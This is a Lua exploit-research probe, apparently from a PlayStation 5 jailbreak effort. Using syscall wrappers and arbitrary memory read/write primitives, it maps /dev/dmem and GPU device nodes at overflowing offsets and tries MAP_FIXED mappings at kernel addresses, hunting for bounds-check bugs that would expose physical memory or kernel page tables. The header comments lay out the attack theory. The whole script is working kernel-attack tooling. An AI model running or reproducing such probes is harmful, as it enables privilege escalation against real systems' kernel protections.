-- CRASH_CLASS: MODERATE -- device pages are mapped PROT_READ|PROT_WRITE and read only after the
-- mapping returns a plausible address; the read is delimited so a fault names its own offset.
-- PROBE 1395a: the mmap offset wraparound on the device nodes, and mmap at a kernel address.
--
-- Every physical-memory attempt so far (259a-263a, 315a-321a, 122a) used offsets inside the device's
-- declared size and got Either a refusal or zeros, which is the answer a correct bounds check gives.
-- The one shape nobody tried is the arithmetic one: a device mmap callback typically computes a
-- PHYSICAL address as `base + (offset >> PAGE_SHIFT)` in a 64-bit type, and if the driver checks the
-- offset only against a device size that is itself small, a huge offset either wraps or produces a
-- physical address far outside the aperture. FreeBSD has shipped exactly this bug more than once.
--
-- So this probe maps each openable memory node at offsets that are large, page-aligned, and chosen
-- to make `offset + i*0x1000` overflow or land in a different physical region, then reads the first
-- page of whatever comes back. A mapping that returns an address and reads NON-ZERO where the same
-- node at offset 0 reads zero is the signature.
--
-- Phase B tests the other end: mmap with MAP_FIXED at a kernel address, which FreeBSD rejects by
-- comparing against VM_MAXUSER_ADDRESS. If the comparison is done after a size addition it can wrap,
-- and a user mapping landing where the kernel's own page tables live is the whole game - PS5 has no
-- KPTI, so the kernel and the user share page tables.
--
-- -- prior art:
--   docs/ATTACK_SURFACE.md (device inventory, /dev/dmem0-2 and the zeros at offset 0)
--   results/phase17_new_vectors/262a_dmem_retest.lua, 263a, 122a-122a4 (physhm)
--   docs/DEAD_ENDS.md ("/dev/dmem0 physical memory - GPU aperture only", "physhm mmap - not backed")

print("=== PROBE 1395a: DEVICE MMAP OFFSET WRAP ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) v = v % 4294967296 return string.format("%08X", v) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function UA(v) if type(v) == "string" then return uint64(v) end return uint64(v) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end
print("[0] SIG_IGN attempt done")

local O_RDWR       = 2
local O_NONBLOCK   = 0x4000     -- NOT 0x4 on this platform
local PROT_RW      = 3
local MAP_SHARED   = 1
local MAP_ANON     = 0x1000
local MAP_FIXED    = 0x10

local function str_addr(s)
    local b = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(b + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(b + #s, 0) end)
    return N(b)
end
local function open_node(path)
    local rv = N(mk(5)(uint64(str_addr(path)), uint64(O_RDWR + O_NONBLOCK), uint64(0), uint64(0), uint64(0), uint64(0)))
    return rv
end
local function mm(addr, len, prot, flags, fd, off)
    local ok, rv = pcall(function()
        return mk(477)(UA(addr), UA(len), uint64(prot), uint64(flags), uint64(fd), UA(off))
    end)
    if not ok then return -99999 end
    return N(rv)
end

-- report the first 8 dwords of a mapping, counting non-zero, and stop at the first dword that
-- cannot be read
local function peek(addr)
    local nz, acc = 0, {}
    for i = 0, 7 do
        local v = rd(addr + i * 4)
        if v == nil then acc[#acc + 1] = "??"; break end
        if v ~= 0 then nz = nz + 1 end
        if #acc < 8 then acc[#acc + 1] = hex(v) end
    end
    return nz, table.concat(acc, " ")
end

print("")
print("[A] device mmap at large and wrapping offsets")
local NODES = {"/dev/dmem0", "/dev/dmem1", "/dev/dmem2", "/dev/gc", "/dev/dce", "/dev/zero"}
local OFFS = {"0x0", "0x1000", "0x10000000", "0x80000000", "0x100000000",
              "0xFFFFFFFFFFF00000", "0xFFFFFFFFFFFFF000", "0xFFFFFFFFFFFFFFFF"}
for _, path in ipairs(NODES) do
    local fd = open_node(path)
    print(string.format("  %-14s open fd=%d", path, fd))
    if fd >= 0 then
        for _, off in ipairs(OFFS) do
            print(string.format("    -> mmap(len=0x2000, off=%s)", off))
            local a = mm(0, 0x2000, PROT_RW, MAP_SHARED, fd, off)
            if a > 0x10000 and a < 0x800000000000 then
                local nz, first = peek(a)
                print(string.format("    <- addr=0x%08X nonzero=%d  %s", a, nz, first))
                pcall(function() mk(73)(uint64(a), uint64(0x2000)) end)
            else
                print(string.format("    <- rv=%d %s", a, a < 0 and es() or ""))
            end
        end
        pcall(function() mk(6)(uint64(fd), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    end
end

print("")
print("[B] mmap with MAP_FIXED at a kernel address and at the top of user space")
local FIX = {
    {"kernel stub",  "0xFFFFFFFFC0000000"},
    {"kernel image", "0xFFFFFFFFC1000000"},
    {"kern absent",  "0xFFFFFFFFD0000000"},
    {"top user",     "0x7FFFFFFF0000"},
    {"top user -pg", "0x7FFFFFFFFFF000"},
}
for _, f in ipairs(FIX) do
    print(string.format("    -> anon MAP_FIXED at %s (%s)", f[2], f[1]))
    local a = mm(f[2], 0x1000, PROT_RW, MAP_ANON + MAP_FIXED, -1, 0)
    if a > 0x10000 then
        local nz, first = peek(a)
        print(string.format("    <- addr=0x%08X nonzero=%d  %s", a, nz, first))
        pcall(function() mk(73)(uint64(a), uint64(0x1000)) end)
    else
        print(string.format("    <- rv=%d %s", a, a < 0 and es() or ""))
    end
end

print("")
print("[C] mmap with a length that wraps the address computation")
local WRAPLEN = {"0xFFFFFFFFFFFFF000", "0xFFFFFFFFFFFFFFFF", "0x7FFFFFFFFFFFF000"}
for _, L in ipairs(WRAPLEN) do
    print(string.format("    -> anon len=%s at 0", L))
    local a = mm(0, L, PROT_RW, MAP_ANON, -1, 0)
    print(string.format("    <- rv=%d %s", a, a < 0 and es() or ""))
    if a > 0x10000 and a < 0x800000000000 then
        local nz, first = peek(a)
        print(string.format("       nonzero=%d %s", nz, first))
        pcall(function() mk(73)(uint64(a), uint64(0x1000)) end)
    end
end

print("=== PROBE 1395a COMPLETE ===")
